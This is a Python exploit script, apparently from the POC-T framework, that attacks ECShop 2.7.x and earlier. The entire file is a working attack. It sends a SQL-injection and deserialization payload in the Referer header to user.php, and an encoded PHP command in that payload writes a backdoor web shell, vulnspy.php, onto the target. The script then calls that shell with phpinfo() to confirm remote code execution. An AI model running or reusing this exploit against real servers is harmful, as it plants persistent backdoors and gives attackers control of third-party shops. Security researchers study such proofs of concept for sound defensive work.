#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = starnight_cyber

"""
    Script : ecshop.py
    Author : starnight_cyber
    Time : 2018.9.1

    ECShop <= 2.7.x Getshell
ECShop <= 2.7.x

"""

import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Content-Type": "text/xml"
}

payload = '''
action=login&vulnspy=eval/**/(base64_decode(ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOycpOw));exit;" \-H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a
'''


def poc(url):
    try:
        # Step 1: POST webshell to target, if remote system is vulnerable, it will create a vulnspy.php on remote machine
        url1 = 'http://' + url + '/ecshop/user.php'
        # print url1
        resp = requests.post(url1, data=payload, headers=headers, timeout=5)  # attack

        # Step 2 : Check whether can execute command on target
        url2 = 'http://' + url + '/vulnspy.php?vulnspy=phpinfo();'
        # print url2, check this url by your hand
        resp = requests.get(url2, timeout=5)

        # check whether succeed or not
        return bool(resp.status_code == 200)

    except Exception:
        # anything wrong, return False
        return False
